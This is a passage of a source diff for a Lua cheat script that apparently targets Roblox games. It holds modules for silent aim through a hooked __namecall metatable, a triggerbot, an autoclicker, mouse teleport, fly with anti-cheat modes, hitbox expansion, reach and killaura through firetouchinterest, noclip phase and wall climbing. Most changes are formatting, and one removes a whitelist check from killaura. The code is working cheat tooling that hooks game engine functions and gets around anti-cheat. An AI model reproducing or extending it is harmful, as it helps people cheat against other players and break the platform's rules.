 					local res = SilentAimFunctions[SilentAimMethod.Value](Args)
-					if res then 
+					if res then
 						return unpack(res)
 					end
 					return oldnamecall(self, unpack(Args))
@@ -816,8 +1136,8 @@ runFunction(function()
 	}
 
 	SilentAim = GuiLibrary.ObjectsThatCanBeSaved.CombatWindow.Api.CreateOptionsButton({
-		Name = "SilentAim", 
-		Function = function(callback) 
+		Name = "SilentAim",
+		Function = function(callback)
 			if callback then
 				SilentAimMethodUsed = "Normal"..synapsev3
 				task.spawn(function()
@@ -827,11 +1147,11 @@ runFunction(function()
 					until not SilentAim.Enabled
 				end)
 				if SilentAimCircle then SilentAimCircle.Visible = SilentAimMode.Value == "Mouse" end
-				if SilentAimEnableFunctions[SilentAimMethodUsed] then 
+				if SilentAimEnableFunctions[SilentAimMethodUsed] then
 					SilentAimEnableFunctions[SilentAimMethodUsed]()
 				end
 			else
-				if restorefunction then 
+				if restorefunction then
 					restorefunction(getrawmetatable(game).__namecall)
 					SilentAimHooked = false
 				end
@@ -839,8 +1159,8 @@ runFunction(function()
 				vapeTargetInfo.Targets.SilentAim = nil
 			end
 		end,
-		ExtraText = function() 
-			return SilentAimMethod.Value:gsub("FindPartOn", ""):gsub("PointToRay", "") 
+		ExtraText = function()
+			return SilentAimMethod.Value:gsub("FindPartOn", ""):gsub("PointToRay", "")
 		end
 	})
 	SilentAimMode = SilentAim.CreateDropdown({
@@ -849,7 +1169,7 @@ runFunction(function()
 		Function = function(val) if SilentAimCircle then SilentAimCircle.Visible = SilentAim.Enabled and val == "Mouse" end end
 	})
 	SilentAimMethod = SilentAim.CreateDropdown({
-		Name = "Method", 
+		Name = "Method",
 		List = {"FindPartOnRayWithIgnoreList", "FindPartOnRayWithWhitelist", "Raycast", "FindPartOnRay", "ScreenPointToRay", "ViewportPointToRay"},
 		Function = function(val)
 			SilentAimRaycastMode.Object.Visible = val == "Raycast"
@@ -863,29 +1183,29 @@ runFunction(function()
 	})
 	SilentAimRaycastMode.Object.Visible = false
 	SilentAimFOV = SilentAim.CreateSlider({
-		Name = "FOV", 
-		Min = 1, 
-		Max = 1000, 
+		Name = "FOV",
+		Min = 1,
+		Max = 1000,
 		Function = function(val) if SilentAimCircle then SilentAimCircle.Radius = val end  end,
 		Default = 80
 	})
 	SilentAimHitChance = SilentAim.CreateSlider({
-		Name = "Hit Chance", 
-		Min = 1, 
-		Max = 100, 
+		Name = "Hit Chance",
+		Min = 1,
+		Max = 100,
 		Function = function(val) end,
 		Default = 100,
 	})
 	SilentAimHeadshotChance = SilentAim.CreateSlider({
-		Name = "Headshot Chance", 
+		Name = "Headshot Chance",
 		Min = 1,
-		Max = 100, 
+		Max = 100,
 		Function = function(val) end,
 		Default = 25
 	})
 	SilentAimCircleToggle = SilentAim.CreateToggle({
 		Name = "FOV Circle",
-		Function = function(callback) 
+		Function = function(callback)
 			if SilentAimCircleColor.Object then SilentAimCircleColor.Object.Visible = callback end
 			if SilentAimCircleFilled.Object then SilentAimCircleFilled.Object.Visible = callback end
 			if callback then
@@ -902,9 +1222,9 @@ runFunction(function()
 					SilentAimCircle.Position = Vector2.new(gameCamera.ViewportSize.X / 2, gameCamera.ViewportSize.Y / 2)
 				end))
 			else
-				if SilentAimCircle then 
-					SilentAimCircle:Destroy() 
-					SilentAimCircle = nil 
+				if SilentAimCircle then
+					SilentAimCircle:Destroy()
+					SilentAimCircle = nil
 				end
 			end
 		end,
@@ -1031,8 +1351,8 @@ runFunction(function()
 	})
 	SilentAimIgnoredScripts = SilentAim.CreateTextList({
 		Name = "Ignored Scripts",
-		TempText = "ignored scripts", 
-		AddFunction = function(user) end, 
+		TempText = "ignored scripts",
+		AddFunction = function(user) end,
 		RemoveFunction = function(num) end
 	})
 
@@ -1042,7 +1362,7 @@ runFunction(function()
 		rayparams.RespectCanCollide = true
 		local ray = workspace:Raycast(gameCamera.CFrame.p, gameCamera.CFrame.lookVector * 10000, rayparams)
 		if ray and ray.Instance then
-			for i,v in pairs(entityLibrary.entityList) do 
+			for i,v in pairs(entityLibrary.entityList) do
 				if v.Targetable and v.Character then
 					if ray.Instance:IsDescendantOf(v.Character) then
 						return isVulnerable(v) and v
@@ -1078,7 +1398,7 @@ runFunction(function()
 						task.wait()
 					until not TriggerBot.Enabled
 				end)
-			else 
+			else
 				if mouse1click and (isrbxactive and isrbxactive() or iswindowactive and iswindowactive()) then
 					if mouseClicked then mouse1release() end
 					mouseClicked = false
@@ -1088,12 +1408,12 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local AutoClicker = {Enabled = false}
 	local AutoClickerCPS = {GetRandomValue = function() return 1 end}
 	local AutoClickerMode = {Value = "Sword"}
 	AutoClicker = GuiLibrary.ObjectsThatCanBeSaved.CombatWindow.Api.CreateOptionsButton({
-		Name = "AutoClicker", 
+		Name = "AutoClicker",
 		Function = function(callback)
 			if callback then
 				task.spawn(function()
@@ -1127,13 +1447,13 @@ runFunction(function()
 	AutoClickerCPS = AutoClicker.CreateTwoSlider({
 		Name = "CPS",
 		Min = 1,
-		Max = 20, 
+		Max = 20,
 		Default = 8,
 		Default2 = 12
 	})
 end)
 
-runFunction(function()
+run(function()
 	local ClickTP = {Enabled = false}
 	local ClickTPMethod = {Value = "Normal"}
 	local ClickTPDelay = {Value = 1}
@@ -1144,30 +1464,30 @@ runFunction(function()
 	ClickTPRaycast.RespectCanCollide = true
 	ClickTPRaycast.FilterType = Enum.RaycastFilterType.Blacklist
 	ClickTP = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		Name = "MouseTP", 
-		Function = function(callback) 
+		Name = "MouseTP",
+		Function = function(callback)
 			if callback then
 				RunLoops:BindToHeartbeat("MouseTP", function()
-					if entityLibrary.isAlive and ClickTPVelocity.Enabled and ClickTPMethod.Value == "SlowTP" then 
+					if entityLibrary.isAlive and ClickTPVelocity.Enabled and ClickTPMethod.Value == "SlowTP" then
 						entityLibrary.character.HumanoidRootPart.Velocity = Vector3.zero
 					end
 				end)
-				if entityLibrary.isAlive then 
+				if entityLibrary.isAlive then
 					ClickTPRaycast.FilterDescendantsInstances = {lplr.Character, gameCamera}
 					local ray = workspace:Raycast(gameCamera.CFrame.p, lplr:GetMouse().UnitRay.Direction * 10000, ClickTPRaycast)
 					local selectedPosition = ray and ray.Position + Vector3.new(0, entityLibrary.character.Humanoid.HipHeight + (entityLibrary.character.HumanoidRootPart.Size.Y / 2), 0)
-					if selectedPosition then 
+					if selectedPosition then
 						if ClickTPMethod.Value == "Normal" then
 							entityLibrary.character.HumanoidRootPart.CFrame = CFrame.new(selectedPosition)
 							ClickTP.ToggleButton(false)
 						else
 							task.spawn(function()
 								repeat
-									if entityLibrary.isAlive then 
+									if entityLibrary.isAlive then
 										local newpos = (selectedPosition - entityLibrary.character.HumanoidRootPart.CFrame.p).Unit
 										newpos = newpos == newpos and newpos * math.min((selectedPosition - entityLibrary.character.HumanoidRootPart.CFrame.p).Magnitude, ClickTPAmount.Value) or Vector3.zero
 										entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(newpos.X, (ClickTPVertical.Enabled and newpos.Y or 0), newpos.Z)
-										if (selectedPosition - entityLibrary.character.HumanoidRootPart.CFrame.p).Magnitude <= 5 then 
+										if (selectedPosition - entityLibrary.character.HumanoidRootPart.CFrame.p).Magnitude <= 5 then
 											break
 										end
 									end
@@ -1186,7 +1506,7 @@ runFunction(function()
 			else
 				RunLoops:UnbindFromHeartbeat("MouseTP")
 			end
-		end, 
+		end,
 		HoverText = "Teleports to where your mouse is."
 	})
 	ClickTPMethod = ClickTP.CreateDropdown({
@@ -1227,7 +1547,7 @@ runFunction(function()
 	ClickTPVelocity.Object.Visible = false
 end)
 
-runFunction(function()
+run(function()
 	local Fly = {Enabled = false}
 	local FlySpeed = {Value = 1}
 	local FlyVerticalSpeed = {Value = 1}
@@ -1257,7 +1577,7 @@ runFunction(function()
 	local d = 0
 	local alternatelist = {"Normal", "AntiCheat A", "AntiCheat B", "AntiCheat C", "AntiCheat D"}
 	Fly = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		Name = "Fly", 
+		Name = "Fly",
 		Function = function(callback)
 			if callback then
 				local FlyPlatformTick = tick() + 0.2
@@ -1316,13 +1636,13 @@ runFunction(function()
 				local FlyTP = false
 				local FlyTPTick = tick()
 				local FlyTPY
-				RunLoops:BindToHeartbeat("Fly", function(delta) 
+				RunLoops:BindToHeartbeat("Fly", function(delta)
 					if entityLibrary.isAlive and (typeof(entityLibrary.character.HumanoidRootPart) ~= "Instance" or isnetworkowner(entityLibrary.character.HumanoidRootPart)) then
 						entityLibrary.character.Humanoid.PlatformStand = FlyPlatformStanding.Enabled
 						if not FlyY then FlyY = entityLibrary.character.HumanoidRootPart.CFrame.p.Y end
 						local movevec = (FlyMoveMethod.Value == "Manual" and calculateMoveVector(Vector3.new(a + d, 0, w + s)) or entityLibrary.character.Humanoid.MoveDirection).Unit
 						movevec = movevec == movevec and Vector3.new(movevec.X, 0, movevec.Z) or Vector3.zero
-						if FlyState.Value ~= "None" then 
+						if FlyState.Value ~= "None" then
 							entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType[FlyState.Value])
 						end
 						if FlyMethod.Value == "Normal" or FlyMethod.Value == "Bounce" then
@@ -1343,7 +1663,7 @@ runFunction(function()
 							if FlyWallCheck.Enabled then
 								FlyRaycast.FilterDescendantsInstances = {lplr.Character, gameCamera}
 								local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, newMovementPosition, FlyRaycast)
-								if ray and ray.Instance.CanCollide then 
+								if ray and ray.Instance.CanCollide then
 									newMovementPosition = (ray.Position - entityLibrary.character.HumanoidRootPart.Position)
 									FlyY = ray.Position.Y
 								end
@@ -1351,7 +1671,7 @@ runFunction(function()
 							local origvelo = entityLibrary.character.HumanoidRootPart.Velocity
 							if FlyMethod.Value == "CFrame" then
 								entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + newMovementPosition
-								if FlyCFrameVelocity.Enabled then 
+								if FlyCFrameVelocity.Enabled then
 									entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(origvelo.X, 0, origvelo.Z)
 								end
 								if FlyPlatformStanding.Enabled then
@@ -1364,7 +1684,7 @@ runFunction(function()
 									entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
 								end
 							else
-								if FlyTPTick <= tick() then 
+								if FlyTPTick <= tick() then
 									FlyTP = not FlyTP
 									if FlyTP then
 										if FlyTPY then FlyY = FlyTPY end
@@ -1386,7 +1706,7 @@ runFunction(function()
 						if FlyPlatform then
 							FlyPlatform.CFrame = (FlyMethod.Value == "Jump" and FlyJumpCFrame or entityLibrary.character.HumanoidRootPart.CFrame * CFrame.new(0, -(entityLibrary.character.Humanoid.HipHeight + (entityLibrary.character.HumanoidRootPart.Size.Y / 2) + 0.53), 0))
 							FlyPlatform.Parent = gameCamera
-							if FlyUp or FlyPlatformTick >= tick() then 
+							if FlyUp or FlyPlatformTick >= tick() then
 								entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Landed)
 							end
 						end
@@ -1408,15 +1728,15 @@ runFunction(function()
 				end
 			end
 		end,
-		ExtraText = function() 
-			if GuiLibrary.ObjectsThatCanBeSaved["Text GUIAlternate TextToggle"].Api.Enabled then 
+		ExtraText = function()
+			if GuiLibrary.ObjectsThatCanBeSaved["Text GUIAlternate TextToggle"].Api.Enabled then
 				return alternatelist[table.find(FlyMethod.List, FlyMethod.Value)]
 			end
 			return FlyMethod.Value
 		end
 	})
 	FlyMethod = Fly.CreateDropdown({
-		Name = "Mode", 
+		Name = "Mode",
 		List = {"Normal", "CFrame", "Jump", "TP", "Bounce"},
 		Function = function(val)
 			FlyY = nil
@@ -1427,32 +1747,32 @@ runFunction(function()
 		end
 	})
 	FlyMoveMethod = Fly.CreateDropdown({
-		Name = "Movement", 
+		Name = "Movement",
 		List = {"Manual", "MoveDirection"},
 		Function = function(val) end
 	})
 	FlyKeys = Fly.CreateDropdown({
-		Name = "Keys", 
+		Name = "Keys",
 		List = {"Space/LeftControl", "Space/LeftShift", "E/Q", "Space/Q"},
 		Function = function(val) end
 	})
 	local states = {"None"}
 	for i,v in pairs(Enum.HumanoidStateType:GetEnumItems()) do if v.Name ~= "Dead" and v.Name ~= "None" then table.insert(states, v.Name) end end
 	FlyState = Fly.CreateDropdown({
-		Name = "State", 
+		Name = "State",
 		List = states,
 		Function = function(val) end
 	})
 	FlySpeed = Fly.CreateSlider({
 		Name = "Speed",
 		Min = 1,
-		Max = 150, 
+		Max = 150,
 		Function = function(val) end
 	})
 	FlyVerticalSpeed = Fly.CreateSlider({
 		Name = "Vertical Speed",
 		Min = 1,
-		Max = 150, 
+		Max = 150,
 		Function = function(val) end
 	})
 	FlyTPOn = Fly.CreateSlider({
@@ -1474,7 +1794,7 @@ runFunction(function()
 	})
 	FlyTPOff.Object.Visible = false
 	FlyPlatformToggle = Fly.CreateToggle({
-		Name = "FloorPlatform", 
+		Name = "FloorPlatform",
 		Function = function(callback)
 			if callback then
 				FlyPlatform = Instance.new("Part")
@@ -1483,9 +1803,9 @@ runFunction(function()
 				FlyPlatform.Size = Vector3.new(2, 1, 2)
 				FlyPlatform.Transparency = 0
 			else
-				if FlyPlatform then 
+				if FlyPlatform then
 					FlyPlatform:Destroy()
-					FlyPlatform = nil 
+					FlyPlatform = nil
 				end
 			end
 		end
@@ -1495,7 +1815,7 @@ runFunction(function()
 		Function = function() end
 	})
 	FlyVertical = Fly.CreateToggle({
-		Name = "Y Level", 
+		Name = "Y Level",
 		Function = function() end
 	})
 	FlyWallCheck = Fly.CreateToggle({
@@ -1512,12 +1832,12 @@ runFunction(function()
 	FlyCFrameVelocity.Object.Visible = false
 end)
 
-runFunction(function()
+run(function()
 	local Hitboxes = {Enabled = false}
 	local HitboxMode = {Value = "HumanoidRootPart"}
 	local HitboxExpand = {Value = 1}
 	Hitboxes = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		Name = "HitBoxes", 
+		Name = "HitBoxes",
 		Function = function(callback)
 			if callback then
 				task.spawn(function()
@@ -1546,7 +1866,7 @@ runFunction(function()
 		Name = "Expand part",
 		List = {"HumanoidRootPart", "Head"},
 		Function = function(val)
-			if Hitboxes.Enabled then 
+			if Hitboxes.Enabled then
 				for i,plr in pairs(entityLibrary.entityList) do
 					if plr.Targetable then
 						if HitboxMode.Value == "HumanoidRootPart" then
@@ -1568,7 +1888,7 @@ runFunction(function()
 end)
 
 local KillauraNearTarget = false
-runFunction(function()
+run(function()
 	local attackIgnore = OverlapParams.new()
 	attackIgnore.FilterType = Enum.RaycastFilterType.Whitelist
 	local function findTouchInterest(tool)
@@ -1578,7 +1898,7 @@ runFunction(function()
 	local Reach = {Enabled = false}
 	local ReachRange = {Value = 1}
 	Reach = GuiLibrary.ObjectsThatCanBeSaved.CombatWindow.Api.CreateOptionsButton({
-		Name = "Reach", 
+		Name = "Reach",
 		Function = function(callback)
 			if callback then
 				task.spawn(function()
@@ -1592,7 +1912,7 @@ runFunction(function()
 								for i,v in pairs(entityLibrary.entityList) do table.insert(chars, v.Character) end
 								ignorelist.FilterDescendantsInstances = chars
 								local parts = workspace:GetPartBoundsInBox(touch.CFrame, touch.Size + Vector3.new(reachrange.Value, 0, reachrange.Value), ignorelist)
-								for i,v in pairs(parts) do 
+								for i,v in pairs(parts) do
 									firetouchinterest(touch, v, 1)
 									firetouchinterest(touch, v, 0)
 								end
@@ -1605,9 +1925,9 @@ runFunction(function()
 		end
 	})
 	ReachRange = Reach.CreateSlider({
-		Name = "Range", 
+		Name = "Range",
 		Min = 1,
-		Max = 20, 
+		Max = 20,
 		Function = function(val) end,
 	})
 
@@ -1619,7 +1939,7 @@ runFunction(function()
 	local KillauraRange = {Value = 1}
 	local KillauraAngle = {Value = 90}
 	local KillauraFakeAngle = {Enabled = false}
-	local KillauraPrediction = {Enabled = true}	
+	local KillauraPrediction = {Enabled = true}
 	local KillauraButtonDown = {Enabled = false}
 	local KillauraTargetHighlight = {Enabled = false}
 	local KillauraRangeCircle = {Enabled = false}
@@ -1628,7 +1948,7 @@ runFunction(function()
 	local KillauraBoxes = {}
 	local OriginalNeckC0
 	local OriginalRootC0
-	for i = 1, 10 do 
+	for i = 1, 10 do
 		local KillauraBox = Instance.new("BoxHandleAdornment")
 		KillauraBox.Transparency = 0.5
 		KillauraBox.Color3 = Color3.fromHSV(KillauraColor.Hue, KillauraColor.Sat, KillauraColor.Value)
@@ -1641,22 +1961,22 @@ runFunction(function()
 	end
 
 	Killaura = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		Name = "Killaura", 
+		Name = "Killaura",
 		Function = function(callback)
 			if callback then
 				if KillauraRangeCirclePart then KillauraRangeCirclePart.Parent = gameCamera end
 				RunLoops:BindToHeartbeat("Killaura", function()
-					for i,v in pairs(KillauraBoxes) do 
+					for i,v in pairs(KillauraBoxes) do
 						if v.Adornee then
-							local onex, oney, onez = v.Adornee.CFrame:ToEulerAnglesXYZ() 
+							local onex, oney, onez = v.Adornee.CFrame:ToEulerAnglesXYZ()
 							v.CFrame = CFrame.new() * CFrame.Angles(-onex, -oney, -onez)
 						end
 					end
-					if entityLibrary.isAlive then 
+					if entityLibrary.isAlive then
 						if KillauraRangeCirclePart then
 							KillauraRangeCirclePart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame - Vector3.new(0, entityLibrary.character.Humanoid.HipHeight + (entityLibrary.character.HumanoidRootPart.Size.Y / 2) - 0.3, 0)
 						end
-						if KillauraFakeAngle.Enabled then 
+						if KillauraFakeAngle.Enabled then
 							local Neck = entityLibrary.character.Head:FindFirstChild("Neck")
 							local LowerTorso = entityLibrary.character.HumanoidRootPart.Parent and entityLibrary.character.HumanoidRootPart.Parent:FindFirstChild("LowerTorso")
 							local RootC0 = LowerTorso and LowerTorso:FindFirstChild("Root")
@@ -1696,9 +2016,6 @@ runFunction(function()
 											table.insert(attackedplayers, v)
 										end
 										vapeTargetInfo.Targets.Killaura = v
-										if not ({WhitelistFunctions:GetWhitelist(v.Player)})[2] then
-											continue
-										end
 										KillauraNearTarget = true
 										if KillauraPrediction.Enabled then
 											if (entityLibrary.LocalPosition - v.RootPart.Position).Magnitude > KillauraRange.Value then
@@ -1709,15 +2026,15 @@ runFunction(function()
 											tool:Activate()
 											KillauraSwingTick = tick() + (1 / KillauraCPS.GetRandomValue())
 										end
-										if KillauraMethod.Value == "Bypass" then 
+										if KillauraMethod.Value == "Bypass" then
 											attackIgnore.FilterDescendantsInstances = {v.Character}
 											local parts = workspace:GetPartBoundsInBox(v.RootPart.CFrame, v.Character:GetExtentsSize(), attackIgnore)
-											for i,v2 in pairs(parts) do 
+											for i,v2 in pairs(parts) do
 												firetouchinterest(touch.Parent, v2, 1)
 												firetouchinterest(touch.Parent, v2, 0)
 											end
 										elseif KillauraMethod.Value == "Normal" then
-											for i,v2 in pairs(v.Character:GetChildren()) do 
+											for i,v2 in pairs(v.Character:GetChildren()) do
 												if v2:IsA("BasePart") then
 													firetouchinterest(touch.Parent, v2, 1)
 													firetouchinterest(touch.Parent, v2, 0)
@@ -1731,7 +2048,7 @@ runFunction(function()
 								end
 							end
 						end
-						for i,v in pairs(KillauraBoxes) do 
+						for i,v in pairs(KillauraBoxes) do
 							local attacked = attackedplayers[i]
 							v.Adornee = attacked and attacked.RootPart
 						end
@@ -1739,7 +2056,7 @@ runFunction(function()
 					until not Killaura.Enabled
 				end)
 			else
-				RunLoops:UnbindFromHeartbeat("Killaura") 
+				RunLoops:UnbindFromHeartbeat("Killaura")
                 KillauraNearTarget = false
 				vapeTargetInfo.Targets.Killaura = nil
 				for i,v in pairs(KillauraBoxes) do v.Adornee = nil end
@@ -1763,9 +2080,9 @@ runFunction(function()
 	KillauraRange = Killaura.CreateSlider({
 		Name = "Attack range",
 		Min = 1,
-		Max = 150, 
-		Function = function(val) 
-			if KillauraRangeCirclePart then 
+		Max = 150,
+		Function = function(val)
+			if KillauraRangeCirclePart then
 				KillauraRangeCirclePart.Size = Vector3.new(val * 0.7, 0.01, val * 0.7)
 			end
 		end
@@ -1773,24 +2090,24 @@ runFunction(function()
 	KillauraAngle = Killaura.CreateSlider({
 		Name = "Max angle",
 		Min = 1,
-		Max = 360, 
+		Max = 360,
 		Function = function(val) end,
 		Default = 90
 	})
 	KillauraColor = Killaura.CreateColorSlider({
 		Name = "Target Color",
-		Function = function(hue, sat, val) 
-			for i,v in pairs(KillauraBoxes) do 
+		Function = function(hue, sat, val)
+			for i,v in pairs(KillauraBoxes) do
 				v.Color3 = Color3.fromHSV(hue, sat, val)
 			end
-			if KillauraRangeCirclePart then 
+			if KillauraRangeCirclePart then
 				KillauraRangeCirclePart.Color = Color3.fromHSV(hue, sat, val)
 			end
 		end,
 		Default = 1
 	})
 	KillauraButtonDown = Killaura.CreateToggle({
-		Name = "Require mouse down", 
+		Name = "Require mouse down",
 		Function = function() end
 	})
 	KillauraTarget = Killaura.CreateToggle({
@@ -1810,7 +2127,7 @@ runFunction(function()
 	KillauraRangeCircle = Killaura.CreateToggle({
 		Name = "Range Visualizer",
 		Function = function(callback)
-			if callback then 
+			if callback then
 				KillauraRangeCirclePart = Instance.new("MeshPart")
 				KillauraRangeCirclePart.MeshId = "rbxassetid://3726303797"
 				KillauraRangeCirclePart.Color = Color3.fromHSV(KillauraColor.Hue, KillauraColor.Sat, KillauraColor.Value)
@@ -1820,7 +2137,7 @@ runFunction(function()
 				KillauraRangeCirclePart.Size = Vector3.new(KillauraRange.Value * 0.7, 0.01, KillauraRange.Value * 0.7)
 				KillauraRangeCirclePart.Parent = gameCamera
 			else
-				if KillauraRangeCirclePart then 
+				if KillauraRangeCirclePart then
 					KillauraRangeCirclePart:Destroy()
 					KillauraRangeCirclePart = nil
 				end
@@ -1829,25 +2146,25 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local LongJump = {Enabled = false}
 	local LongJumpBoost = {Value = 1}
 	local LongJumpChange = true
 	LongJump = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		Name = "LongJump", 
+		Name = "LongJump",
 		Function = function(callback)
 			if callback then
 				if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
 					entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
 				end
-				RunLoops:BindToHeartbeat("LongJump", function() 
+				RunLoops:BindToHeartbeat("LongJump", function()
 					if entityLibrary.isAlive then
 						if (entityLibrary.character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall or entityLibrary.character.Humanoid:GetState() == Enum.HumanoidStateType.Jumping) and entityLibrary.character.Humanoid.MoveDirection ~= Vector3.zero then
 							local velo = entityLibrary.character.Humanoid.MoveDirection * LongJumpBoost.Value
 							entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(velo.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, velo.Z)
 						end
 						local check = entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air
-						if LongJumpChange ~= check then 
+						if LongJumpChange ~= check then
 							if check then LongJump.ToggleButton(true) end
 							LongJumpChange = check
 						end
@@ -1862,7 +2179,7 @@ runFunction(function()
 	LongJumpBoost = LongJump.CreateSlider({
 		Name = "Boost",
 		Min = 1,
-		Max = 150, 
+		Max = 150,
 		Function = function(val) end
 	})
 
@@ -1874,7 +2191,7 @@ runFunction(function()
 	local HighJumpTick = tick()
 	local highjumpBound = true
 	HighJump = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		Name = "HighJump", 
+		Name = "HighJump",
 		Function = function(callback)
 			if callback then
 				if HighJumpMethod.Value == "Toggle" then
@@ -1885,7 +2202,7 @@ runFunction(function()
 					end
 					if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
 						HighJumpTick = tick() + (HighJumpDelay.Value / 10)
-						if HighJumpMode.Value == "Normal" then  
+						if HighJumpMode.Value == "Normal" then
 							entityLibrary.character.HumanoidRootPart.Velocity = entityLibrary.character.HumanoidRootPart.Velocity + Vector3.new(0, HighJumpBoost.Value, 0)
 						else
 							task.spawn(function()
@@ -1904,7 +2221,7 @@ runFunction(function()
 					RunLoops:BindToRenderStep("HighJump", function()
 						if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air and inputService:IsKeyDown(Enum.KeyCode.Space) and (tick() - debounce) > 0.3 then
 							debounce = tick()
-							if HighJumpMode.Value == "Normal" then  
+							if HighJumpMode.Value == "Normal" then
 								entityLibrary.character.HumanoidRootPart.Velocity = entityLibrary.character.HumanoidRootPart.Velocity + Vector3.new(0, HighJumpBoost.Value, 0)
 							else
 								task.spawn(function()
@@ -1926,26 +2243,26 @@ runFunction(function()
 		HoverText = "Lets you jump higher"
 	})
 	HighJumpMethod = HighJump.CreateDropdown({
-		Name = "Method", 
+		Name = "Method",
 		List = {"Toggle", "Normal"},
 		Function = function(val) end
 	})
 	HighJumpMode = HighJump.CreateDropdown({
-		Name = "Mode", 
+		Name = "Mode",
 		List = {"Normal", "CFrame"},
 		Function = function(val) end
 	})
 	HighJumpBoost = HighJump.CreateSlider({
 		Name = "Boost",
 		Min = 1,
-		Max = 150, 
+		Max = 150,
 		Function = function(val) end,
 		Default = 100
 	})
 	HighJumpDelay = HighJump.CreateSlider({
 		Name = "Delay",
 		Min = 0,
-		Max = 50, 
+		Max = 50,
 		Function = function(val) end,
 	})
 end)
@@ -1953,7 +2270,7 @@ end)
 local spiderHoldingShift = false
 local Spider = {Enabled = false}
 local Phase = {Enabled = false}
-runFunction(function()
+run(function()
 	local PhaseMode = {Value = "Normal"}
 	local PhaseStudLimit = {Value = 1}
 	local PhaseModifiedParts = {}
@@ -1971,13 +2288,13 @@ runFunction(function()
 			PhaseOverlap.FilterDescendantsInstances = chars
 			local rootpos = entityLibrary.character.HumanoidRootPart.CFrame.p
 			local parts = workspace:GetPartBoundsInRadius(rootpos, 2, PhaseOverlap)
-			for i, v in pairs(parts) do 
-				if v.CanCollide and (v.Position.Y + (v.Size.Y / 2)) > (rootpos.Y - entityLibrary.character.Humanoid.HipHeight) and (not Spider.Enabled or spiderHoldingShift) then 
+			for i, v in pairs(parts) do
+				if v.CanCollide and (v.Position.Y + (v.Size.Y / 2)) > (rootpos.Y - entityLibrary.character.Humanoid.HipHeight) and (not Spider.Enabled or spiderHoldingShift) then
 					PhaseModifiedParts[v] = true
 					v.CanCollide = false
 				end
 			end
-			for i,v in pairs(PhaseModifiedParts) do 
+			for i,v in pairs(PhaseModifiedParts) do
 				if not table.find(parts, i) then
 					PhaseModifiedParts[i] = nil
 					i.CanCollide = true
@@ -2007,7 +2324,7 @@ runFunction(function()
 	}
 
 	Phase = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		Name = "Phase", 
+		Name = "Phase",
 		Function = function(callback)
 			if callback then
 				RunLoops:BindToStepped("Phase", function() -- has to be ran on stepped idk why
@@ -2026,7 +2343,7 @@ runFunction(function()
 	PhaseMode = Phase.CreateDropdown({
 		Name = "Mode",
 		List = {"Part", "Character", "TP"},
-		Function = function(val) 
+		Function = function(val)
 			if PhaseStudLimit.Object then
 				PhaseStudLimit.Object.Visible = val == "TP"
 			end
@@ -2041,7 +2358,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local SpiderSpeed = {Value = 0}
 	local SpiderState = {Enabled = false}
 	local SpiderMode = {Value = "Normal"}
@@ -2078,7 +2395,7 @@ runFunction(function()
 							if SpiderActive and (newray or newray2).Normal.Y == 0 then
 								if not Phase.Enabled or not spiderHoldingShift then
 									if SpiderState.Enabled then entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Climbing) end
-									if SpiderMode.Value == "CFrame" then 
+									if SpiderMode.Value == "CFrame" then
 										entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(-(entityLibrary.character.HumanoidRootPart.CFrame.lookVector.X * 18) * delta, SpiderSpeed.Value * delta, -(entityLibrary.character.HumanoidRootPart.CFrame.lookVector.Z * 18) * delta)
 									else
 										entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(entityLibrary.character.HumanoidRootPart.Velocity.X - (entityLibrary.character.HumanoidRootPart.CFrame.lookVector.X / 2), SpiderSpeed.Value, entityLibrary.character.HumanoidRootPart.Velocity.Z - (entityLibrary.character.HumanoidRootPart.CFrame.lookVector.Z / 2))
@@ -2089,7 +2406,7 @@ runFunction(function()
 							local vec = entityLibrary.character.HumanoidRootPart.CFrame.lookVector * 1.5
 							local newray2 = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, (vec - Vector3.new(0, entityLibrary.character.Humanoid.HipHeight, 0)), SpiderRaycast)
 							spiderHoldingShift = inputService:IsKeyDown(Enum.KeyCode.LeftShift)
-							if newray2 and (not Phase.Enabled or not spiderHoldingShift) then 
+							if newray2 and (not Phase.Enabled or not spiderHoldingShift) then
 								local newray2pos = newray2.Instance.Position
 								local newpos = clampSpiderPosition(entityLibrary.character.HumanoidRootPart.Position, Vector3.new(newray2pos.X, math.min(entityLibrary.character.HumanoidRootPart.Position.Y, newray2pos.Y), newray2pos.Z), newray2.Instance.Size - Vector3.new(1.9, 1.9, 1.9))
 								SpiderPart.Position = newpos
@@ -2109,9 +2426,9 @@ runFunction(function()
